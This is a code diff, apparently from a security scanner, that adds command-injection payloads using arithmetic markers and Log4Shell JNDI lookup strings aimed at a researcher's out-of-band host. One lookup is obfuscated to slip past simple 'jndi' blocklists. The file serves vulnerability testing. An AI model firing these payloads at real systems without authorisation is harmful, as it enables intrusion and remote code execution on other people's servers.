@@ -148,6 +148,32 @@ JWT_EXPLOITS: list[Payload] = [
             "secret. Token milik sendiri."),
 ]
 
+# ---------------------------------------------------------------- CMD-ARITH
+CMD_ARITH: list[Payload] = [
+    # bukti eksekusi via aritmetika — marker "2345" hanyalah hasil perhitungan
+    # server; differential vs baseline WAJIB (angka 2345 di baseline = bukan bukti)
+    Payload("cmd-arith-bash", "; echo $((1234+1111))", "2345", "critical",
+            "sh/bash: echo $(( )) dievaluasi server -> 2345"),
+    Payload("cmd-arith-cmdexe", "& set /a 1234+1111", "2345", "critical",
+            "Windows cmd.exe: set /a menghitung -> 2345"),
+    Payload("cmd-arith-backtick", "`expr 1234 + 1111`", "2345", "critical",
+            "Unix backtick + expr -> 2345"),
+    Payload("cmd-arith-subst", "$(expr 1234 + 1111)", "2345", "critical",
+            "Command substitution + expr -> 2345"),
+]
+
+# ---------------------------------------------------------------- JNDI
+JNDI_PINGBACK: list[Payload] = [
+    # {host} diganti host capture OOB milik peneliti di engine (bukan di sini)
+    Payload("jndi-ldap", "${jndi:ldap://{host}/j}", "", "critical",
+            "Log4Shell klasik: lookup LDAP ke capture peneliti"),
+    Payload("jndi-rmi", "${jndi:rmi://{host}/j}", "", "critical",
+            "Varian RMI (classpath tanpa LDAP)"),
+    Payload("jndi-obfuscated", "${${lower:j}ndi:ldap://{host}/j2}", "", "critical",
+            "Obfuscation blocklist naif 'jndi' — menguji parser log4j, "
+            "bukan menghindari WAF untuk akses tanpa izin"),
+]
+
 
 def by_severity(items: list[Payload], floor: str) -> list[Payload]:
     order = {"low": 0, "medium": 1, "high": 2, "critical": 3}
